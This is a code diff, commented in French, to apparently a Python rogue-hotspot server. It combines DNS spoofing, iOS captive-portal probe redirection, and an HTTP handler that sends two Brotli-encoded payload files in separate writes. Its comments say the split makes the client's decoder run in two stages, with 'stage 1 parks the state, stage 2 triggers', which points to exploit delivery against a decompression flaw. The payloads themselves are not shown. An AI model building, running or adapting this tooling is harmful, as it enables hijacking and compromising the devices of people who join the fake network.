@@ -40,6 +40,9 @@ def dns_server(ip, bind_ip="0.0.0.0", upstream=None, spoof_all=False):
         s.bind((bind_ip, 53))
     except OSError as e:
         print(f"[dns] ECHEC bind {bind_ip}:53 -> {e}")
+        # le partage de connexion de Windows (ICS) choure le port 53 en 0.0.0.0
+        # et en exclusif. on arrive quand meme a binder sur .1 et .2, mais c'est
+        # la loterie selon l'ordre de demarrage. d'ou les deux conseils ci-dessous.
         print("[dns] Le proxy DNS d'ICS squatte peut-etre le port. Deux sorties :")
         print("[dns]   1) relancer avec  --dns-bind <ip>  (l'IP exacte du hotspot)")
         print("[dns]   2) couper ICS et utiliser hostapd sous WSL (voir README)")
@@ -164,12 +167,16 @@ class Handler(BaseHTTPRequestHandler):
         return FALLBACK, ct, False
 
     def _chunked(self, chemin1=None, chemin2=None, mode=None):
+        # on triche sur le transport: deux ecritures separees pour que le decodeur
+        # soit appele deux fois (stage 1 parke l'etat, stage 2 declenche). en un seul
+        # bloc ca ne fait rien du tout.
         first = open(chemin1 or ARGS.chunked_first, "rb").read()
         second = open(chemin2 or ARGS.chunked_second, "rb").read()
         mode = mode or ARGS.chunked_mode
 
         if mode == "cl":
-            # longueur annoncee, ecriture en deux temps (pas de chunked)
+            # Content-Length au lieu de chunked. contre-intuitif, mais c'est le seul
+            # transport qui fait aller un corps de 23 Mo au bout au lieu de le couper.
             total = len(first) - 1 + len(second)
             log({"note": "chunked", "mode": mode, "first": len(first), "second": len(second),
                  "from": self.client_address[0]})
@@ -198,22 +205,6 @@ class Handler(BaseHTTPRequestHandler):
         def w(bloc):
             self.wfile.write(b"%x\r\n" % len(bloc) + bloc + b"\r\n")
             self.wfile.flush()
-
-        if mode == "cl":
-            # longueur annoncee, ecriture en deux temps (pas de chunked)
-            total = len(first) - 1 + len(second)
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Encoding", "br")
-            self.send_header("Content-Length", str(total))
-            self.send_header("Cache-Control", "no-store")
-            self.end_headers()
-            self.wfile.write(first[:-1])
-            self.wfile.flush()
-            time.sleep(ARGS.chunked_delay / 1000.0)
-            self.wfile.write(second)
-            self.wfile.flush()
-            return
 
         if mode == "oobfast":
             # variante rapide : grosses tranches, aucun delai, flush a chaque envoi
@@ -311,6 +302,9 @@ class Handler(BaseHTTPRequestHandler):
 
         # la sonde captive -> redirection explicite vers le portail
         if ARGS.portal and self.path.split("?")[0].startswith("/hotspot-detect.html"):
+            # 511 "network authentication required" c'est le code prevu pour ce cas.
+            # iOS ne le suit pas, il ne suit que le 302. garde quand meme,
+            # quelqu'un en aura besoin un jour (ou pas).
             log({"note": "sonde-redirect", "code": ARGS.probe_code, "from": self.client_address[0]})
             self.send_response(ARGS.probe_code)
             self.send_header("Location", ARGS.portal)
